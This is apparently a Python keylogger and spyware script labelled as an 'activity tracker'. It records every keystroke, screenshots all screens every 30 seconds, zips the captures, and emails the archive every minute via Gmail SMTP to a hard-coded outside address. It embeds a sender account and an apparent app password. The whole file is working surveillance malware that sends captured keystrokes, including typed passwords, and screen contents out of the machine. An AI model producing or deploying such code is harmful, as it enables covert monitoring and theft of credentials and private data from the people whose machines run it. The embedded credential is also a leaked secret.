import glob
import os
import smtplib
import threading
import time
import zipfile
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from functools import partial

import pyautogui
from PIL import ImageGrab
from pynput.keyboard import Key, Listener

ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)

if os.path.exists("D:\\Picture\\"):
    zipfile.ZipFile("D:\\Picture\\logs.zip", "w")
    pass
else:
    os.mkdir('D:\\Picture')
    os.mkdir('D:\\Picture\\Default')
    zipfile.ZipFile("D:\\Picture\\logs.zip", "w")
    pass

keys = []
count = 0


def keyboard():
    count = 0
    keys = []

    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1

        if count >= 10:
            write_file(keys)
            keys = []
            count = 0

    def write_file(keys):
        with open("D:\\Picture\\Default\\logs.txt", "a") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def ss():
    threading.Timer(30.0, ss).start()
    ekran_goruntusu = pyautogui.screenshot()
    dosya_adi = str(time.time_ns()) + ".jpg"
    dosya_yolu = os.path.join('D:\\Picture\\Default', dosya_adi)
    ekran_goruntusu.save(dosya_yolu)


def rar():
    arsivlenecekDosyalar = []
    threading.Timer(280.0, rar).start()
    for belge in glob.iglob("D:\\Picture\\Default\\**/*", recursive=True):
        arsivlenecekDosyalar.append(belge)
    with zipfile.ZipFile("D:\\Picture\\logs.zip", "w") as arsiv:
        for dosya in arsivlenecekDosyalar:
            arsiv.write(dosya)


def mail():
    threading.Timer(60.0, mail).start()
    sendEmail = "technobrainshrms@gmail.com"
    toEmail = "tbs.rachit@gmail.com"

    msg = MIMEMultipart()
    emailSubject = "Activity tracker Data!"
    msg['from'] = sendEmail
    msg['to'] = toEmail
    msg['Subject'] = emailSubject
    msg['message'] = "Daily activity tracker data"

    msgText = "You can find it attached below: "
    msg.attach(MIMEText(msgText, 'html'))
    zipFile = "logs.zip"
    attachment = open("D:\\Picture\\logs.zip", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % zipFile)

    msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sendEmail, "ehwoynbsnpxhywzk")
        text = msg.as_string()
        server.sendmail(sendEmail, toEmail, text)
        server.quit()
    except SMTPException:
        print("Error: unable to send email")
        server.quit()


if __name__ == '__main__':
    t1 = threading.Thread(target=keyboard)
    t2 = threading.Thread(target=ss)
    t3 = threading.Thread(target=rar)
    t4 = threading.Thread(target=mail)
    t1.start()
    t2.start()
    t3.start()
    t4.start()
